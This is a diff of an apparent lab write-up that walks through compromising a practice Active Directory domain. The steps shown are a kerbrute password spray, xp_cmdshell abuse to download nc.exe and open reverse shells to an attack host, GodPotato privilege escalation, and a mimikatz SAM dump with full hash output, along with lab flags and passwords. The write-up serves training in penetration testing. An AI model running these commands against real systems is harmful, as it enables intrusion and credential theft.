@@ -235,7 +235,7 @@ List of valid users
       sudo responder -I ens224 -wrfv
       ```
 
-      <figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption><p>AB920</p></figcaption></figure>
+      <figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption><p>AB920</p></figcaption></figure>
 
 **What is this user's cleartext password?**
 
@@ -258,41 +258,227 @@ List of valid users
 
 **Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain**.
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption><p>krbtgt</p></figcaption></figure>
+Checked domain password policy and got
+
+```
+Unicode        : @{Unicode=yes}
+SystemAccess   : @{MinimumPasswordAge=0; MaximumPasswordAge=42; MinimumPasswordLength=1; PasswordComplexity=0;
+                 PasswordHistorySize=0; LockoutBadCount=0; RequireLogonToChangePassword=0;
+                 ForceLogoffWhenHourExpire=0; ClearTextPassword=0; LSAAnonymousNameLookup=0}
+KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
+Version        : @{signature="$CHICAGO$"; Revision=1}
+RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
+Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
+                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
+GPODisplayName : Default Domain Policy
+```
+
+The above system accexx field shows that we can password spray without worrying of account getting locked.
+
+```
+Get-DomainUser | select samaccountname > valid_user.txt
+```
+
+Cleanup the txt file and performed password spray.
+
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_user.txt Welcome1
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 07/06/23 - Ronnie Flathers @ropnop
+
+2023/07/06 23:09:26 >  Using KDC(s):
+2023/07/06 23:09:26 >   172.16.7.3:88
+
+2023/07/06 23:09:42 >  [+] VALID LOGIN:  BR086@inlanefreight.local:Welcome1
+2023/07/06 23:09:42 >  Done! Tested 2901 logins (1 successes) in 16.063 seconds
+```
 
 **What is this user's password?**
 
-<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
-
-
+```
+BR086@inlanefreight.local:Welcome1
+```
 
 **Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?**
 
+<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>We can see that in smb share there is a config file that this user has access to has a password</p></figcaption></figure>
 
-
-
+netdb:D@ta\_bAse\_adm1n!
 
 **Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.**
 
+```
+.\mssqlclient.exe INLANEFREIGHT.LOCAL/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
+```
 
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>netdb:D@ta_bAse_adm1n!</p></figcaption></figure>
+
+Seems like the xp\_cmdshell is working without enabling it
+
+<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>service\mssql$sqlexpress</p></figcaption></figure>
+
+Since we can execute commands through xp\_cmdshell, we can try to move file overthere and try getting reverse shell.
+
+Start python server at linux attack machine where the nc.exe is present
+
+<pre><code><strong>xp_cmdshell "powershell.exe wget http://172.16.7.240:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+</strong>xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe 172.16.7.240 4444"
+</code></pre>
+
+Don't forget to run nc -lvnp 4444 at the attack host.
+
+<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>got the shell</p></figcaption></figure>
+
+Since the seImpersonate was enabled there are few vulnerabilities that we could try. We can check if the system is vulnerable to juicy potato attack
+
+```
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
+
+Host Name:                 SQL01
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+System Type:               x64-based PC
+Hotfix(s):                 5 Hotfix(s) Installed.
+```
+
+juicy potato requries CLSRid which for me seems to be hard to get and can't exploite, then I tried GODPOTATO and it works like a charm!!.
+
+{% embed url="https://github.com/BeichenDream/GodPotato" %}
+
+```
+./GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 172.16.7.240 2012"
+
+nc -lvnp 2012
+```
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>nt authority\system</p></figcaption></figure>
+
+s3imp3rs0nate\_cl@ssic
 
 **Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.**
 
+```
+./mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+572     {0;000003e7} 1 D 35085          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 1 D 2532987     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,10p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2577669     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : SQL01
+SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
+Local SID : S-1-5-21-3827174835-953655006-33323432
+
+SAMKey : 1f3713f605ea38af43344dc944dea5ce
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 880170df783dda58497007c8de7a836f
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-GVQQMKJCNDAAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a6b660de661c6a558a414560082262069223fb9815fab1f08169e0bb3954bc10
+      aes128_hmac       (4096) : da03dd69f9d316baf21d16bb0639a559
+      des_cbc_md5       (4096) : ef9898bf10c754b5
+    OldCredentials
+      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
+      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
+      des_cbc_md5       (4096) : 9876615285c2766e
+    OlderCredentials
+      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
+      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
+      des_cbc_md5       (4096) : d32592d63b75ec1f
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-GVQQMKJCNDAAdministrator
+    Credentials
+      des_cbc_md5       : ef9898bf10c754b5
+    OldCredentials
+      des_cbc_md5       : 9876615285c2766e
 
 
+RID  : 000001f5 (501)
+User : Guest
 
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
+      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
+      des_cbc_md5       (4096) : 61299e7a768fa2d5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 61299e7a768fa2d5
+```
+
+<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption><p>exc3ss1ve_adm1n_r1ights!</p></figcaption></figure>
 
 **Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What this user's account name?**
 
-
+<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption><p>CT059</p></figcaption></figure>
 
 **Crack this user's password hash and submit the cleartext password as your answer.**
 
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>ct059</p></figcaption></figure>
 
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption><p>CT059:charlie1</p></figcaption></figure>
 
 **Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.**
 
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 **Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.**
+
+![](<../../../.gitbook/assets/image (14).png>)
 
